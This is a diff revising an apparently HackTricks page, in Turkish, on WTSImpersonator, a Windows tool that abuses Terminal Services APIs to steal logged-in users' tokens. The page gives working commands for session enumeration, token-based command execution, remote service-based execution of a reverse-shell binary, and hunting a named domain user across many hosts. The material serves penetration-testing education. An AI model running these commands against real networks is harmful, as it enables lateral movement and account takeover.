@@ -2,53 +2,53 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**WTS Impersonator** aracı, oturum açmış kullanıcıları gizlice enumerate etmek ve token'larını ele geçirmek için **"\\pipe\LSM_API_service"** RPC Named pipe'ını istismar eder; böylece geleneksel Token Impersonation tekniklerini atlatır. Bu yaklaşım, ağlar içinde sorunsuz lateral movement gerçekleştirilmesini kolaylaştırır. Bu tekniğin arkasındaki yenilik, çalışmasına [GitHub](https://github.com/OmriBaso/WTSImpersonator) üzerinden erişilebilen **Omri Baso**'ya aittir.<sup>[[1]](#references)</sup>
+**WTSImpersonator**, Omri Baso tarafından geliştirilmiştir; `\\pipe\LSM_API_service` RPC named pipe üzerinden sunulan Windows Terminal Services API'lerini kullanarak oturum açmış session'ları enumerate eder ve seçilen kullanıcının token'ı ile bir process başlatır. Local enumeration ve execution'ın yanı sıra remote service-based workflow'ları da destekler.<sup>[[1]](#references)</sup>
 
-### Temel İşlevsellik
+## Temel işlevsellik
 
-Araç, bir dizi API çağrısı üzerinden çalışır:
-```bash
+Local execution flow aşağıdaki API sequence'ini kullanır:<sup>[[1]](#references)[[2]](#references)</sup>
+```text
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Temel Modüller ve Kullanım
+## Modüller ve kullanım
 
-- **Kullanıcıları Enumerate Etme**: Araçla, aşağıdaki komutlar kullanılarak yerel ve uzak kullanıcı enumeration işlemleri gerçekleştirilebilir:
+- **Kullanıcıları listeleme:** Araç, local veya remote host üzerindeki session'ları listeleyebilir.
 
-- Yerel:
+- Locally:
 ```bash
 .\WTSImpersonator.exe -m enum
 ```
-- Bir IP adresi veya hostname belirterek uzak:
+- Remotely, bir IP adresi veya hostname belirtin:
 ```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Komut Çalıştırma**: `exec` ve `exec-remote` modüllerinin çalışması için **Service** context gerekir. Yerel çalıştırma için yalnızca WTSImpersonator executable dosyası ve bir komut gerekir:
+- **Komutları yürütme:** `exec` ve `exec-remote` modülleri bir service context gerektirir. Microsoft, `WTSQueryUserToken` işlevinin caller'ın `LocalSystem` olarak ve `SE_TCB_NAME` privilege ile çalışmasını gerektirdiğini belirtir.<sup>[[2]](#references)</sup>
 
-- Yerel komut çalıştırma örneği:
+- Local command execution:
 ```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- Bir Service context elde etmek için PsExec64.exe kullanılabilir:
+- PsExec, testing amacıyla bir `LocalSystem` command prompt başlatabilir:
 ```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Uzak Komut Çalıştırma**: PsExec.exe'ye benzer şekilde uzaktan bir Service oluşturulmasını ve kurulmasını içerir; böylece uygun izinlerle çalıştırma yapılabilir.
+- **Remote command execution:** Remote mode, PsExec benzeri bir workflow ile target üzerinde bir service oluşturur ve bu nedenle söz konusu service'i install ve start etme rights gerektirir.<sup>[[1]](#references)</sup>
 
-- Uzak çalıştırma örneği:
+- Example:
 ```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **User Hunting Modülü**: Birden fazla makinedeki belirli kullanıcıları hedef alarak kodu onların kimlik bilgileri altında çalıştırır. Bu, birkaç sistemde local admin haklarına sahip Domain Admins kullanıcılarını hedeflemek için özellikle kullanışlıdır.
-- Kullanım örneği:
+- **User hunting:** `user-hunter` module, bir host listesinde adı belirtilen kullanıcının session'ını arar ve sağlanan programı bu context'te execute etmeyi dener.<sup>[[1]](#references)</sup>
+- Usage example:
 ```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
-## Referanslar
+## References
 
-- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)
-
+- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
+- [2] [Microsoft: `WTSQueryUserToken` işlevi](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
 {{#include ../../banners/hacktricks-training.md}}
